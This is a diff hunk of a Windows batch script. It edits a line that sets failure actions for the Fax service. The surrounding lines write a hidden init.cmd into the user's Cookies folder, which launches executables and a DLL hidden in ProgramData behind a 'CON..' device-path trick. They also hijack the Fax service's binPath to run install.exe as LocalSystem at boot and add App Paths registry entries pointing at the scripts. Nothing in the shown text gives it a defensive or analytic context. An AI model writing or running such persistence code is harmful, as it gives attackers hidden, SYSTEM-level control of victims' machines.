@@ -23,7 +23,7 @@ echo @echo off > "%USERPROFILE%\Cookies\init.cmd"
 echo powershell.exe \\.\%ProgramData%\CON..\Input.exe \\.\%ProgramData%\CON..\Kape.dll >> "%USERPROFILE%\Cookies\init.cmd"
 
 sc config Fax binPath= "%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
-sc failure Fax reset=0 actions=//0//0//0
+sc failure Fax reset=0 actions=/0/0/0
 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\start.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\init.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\ini.cmd" /f
